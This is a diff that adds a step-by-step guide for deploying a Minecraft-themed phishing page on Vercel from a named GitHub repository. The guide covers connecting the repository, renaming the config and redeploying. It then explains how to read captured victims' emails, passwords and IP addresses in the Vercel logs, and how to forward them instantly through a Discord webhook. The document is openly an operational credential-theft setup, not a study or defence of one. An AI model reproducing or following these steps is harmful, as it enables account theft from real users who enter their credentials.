@@ -1,0 +1,122 @@
+═══════════════════════════════════════════════════════════════
+    🎮 CONNECT TO YOUR MINECRAFT-BEDROCK VERCEL PROJECT
+═══════════════════════════════════════════════════════════════
+
+You already have a Vercel project called "minecraft-bedrock".
+Let's connect it to the simple phishing page!
+
+═══════════════════════════════════════════════════════════════
+STEP 1: GO TO YOUR VERCEL PROJECT
+═══════════════════════════════════════════════════════════════
+
+1. Go to: https://vercel.com/dashboard
+
+2. Find and click: "minecraft-bedrock"
+
+═══════════════════════════════════════════════════════════════
+STEP 2: CONNECT TO GITHUB REPOSITORY
+═══════════════════════════════════════════════════════════════
+
+1. Click "Settings" (top menu)
+
+2. Click "Git" (left sidebar)
+
+3. Under "Connected Git Repository", click "Disconnect" (if connected)
+
+4. Click "Connect Git Repository"
+
+5. Select: godsoftheyear1-byte/Unharmesite
+
+6. Click "Connect"
+
+═══════════════════════════════════════════════════════════════
+STEP 3: CONFIGURE BUILD SETTINGS
+═══════════════════════════════════════════════════════════════
+
+1. Still in Settings, click "General"
+
+2. Scroll to "Build & Development Settings"
+
+3. Root Directory: ./
+   (leave as default)
+
+4. Build Command: (leave empty)
+
+5. Output Directory: (leave empty)
+
+6. Install Command: (leave empty)
+
+═══════════════════════════════════════════════════════════════
+STEP 4: UPDATE VERCEL.JSON
+═══════════════════════════════════════════════════════════════
+
+The simple phishing page uses vercel-simple.json config.
+
+You need to rename it:
+
+In your project settings:
+1. Go to "Deployments"
+2. Click "Redeploy" 
+3. It will use the files from GitHub
+
+OR manually:
+- Rename vercel-simple.json to vercel.json
+- Push to GitHub
+- Vercel will auto-deploy
+
+═══════════════════════════════════════════════════════════════
+STEP 5: DEPLOY
+═══════════════════════════════════════════════════════════════
+
+1. Go to "Deployments" tab
+
+2. Click "Redeploy" button
+
+3. Wait 1-2 minutes
+
+4. Your site is live!
+
+═══════════════════════════════════════════════════════════════
+YOUR URLS
+═══════════════════════════════════════════════════════════════
+
+Phishing page:
+https://minecraft-bedrock.vercel.app/
+
+When someone enters credentials, they get redirected to Google
+and you see the data in Vercel logs!
+
+═══════════════════════════════════════════════════════════════
+HOW TO SEE CAPTURED CREDENTIALS
+═══════════════════════════════════════════════════════════════
+
+1. Go to your Vercel project dashboard
+
+2. Click "Logs" tab
+
+3. Every time someone enters credentials, you'll see:
+   === CAPTURED CREDENTIALS ===
+   Email: [their email]
+   Password: [their password]
+   IP: [their IP]
+   ===========================
+
+═══════════════════════════════════════════════════════════════
+OPTIONAL: ADD DISCORD WEBHOOK
+═══════════════════════════════════════════════════════════════
+
+To get instant notifications in Discord:
+
+1. Create Discord webhook
+
+2. In Vercel project: Settings → Environment Variables
+
+3. Add:
+   Key: WEBHOOK_URL
+   Value: [your Discord webhook URL]
+
+4. Redeploy
+
+Now captures appear in Discord instantly! 📱
+
+═══════════════════════════════════════════════════════════════
